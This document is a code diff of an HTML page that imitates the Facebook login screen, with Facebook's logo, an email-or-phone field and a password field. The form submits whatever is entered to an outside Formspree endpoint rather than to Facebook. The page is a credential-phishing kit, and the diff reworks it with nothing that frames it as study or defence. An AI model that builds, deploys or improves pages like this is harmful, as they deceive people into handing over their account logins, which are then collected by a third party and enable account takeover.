@@ -5,31 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
-    <link rel="stylesheet" href="style.css">
-
+     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="form-container">
+    <div class="form-container" id="formPage">
+         <form action="https://formspree.io/f/xeqyqaay" method="POST">
         <div class="logo"> 
             <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
         </div>
 
-             <button id="login-btn">Login</button>
+        <div class="email">
+            <label for="email">Email or Phone</label>
+            <div class="sec-2">
+                <ion-icon name="mail-outline"></ion-icon>
+                <input type="text" id="email" name="email" placeholder="Enter Email Or Phone Number">
+            </div>
+        </div>
+
+        <div class="fullname">
+            <label for="fullname">Password</label>
+            <div class="sec-2">
+                <ion-icon name="person-outline"></ion-icon>
+                <input type="text" id="fullname" name="fullname" placeholder="Enter Your Password">
+            </div>
+        </div>
+
+        <button class="send" onclick="sendFormData()">Login</button>
+
+      </form>
     </div>
-
-    <!-- Form Page -->
-    <div class="form-page" id="formPage">
-        <form action="https://formspree.io/f/meqbwbna" method="POST">
-            <label for="email">Enter Email or Phone:</label>
-            <input type="email" id="email" name="email" placeholder="Enter Email or Phone" required>
-
-            <label for="name">Enter Passmord:</label>
-            <input type="text" id="name" name="name" placeholder="Enter Your Pass word" required>
-
-        </form>
-    </div>
-
-        <script src="script.js"></script>
-    </div>
+            <script src="script.js"></script>
 </body>
 </html>
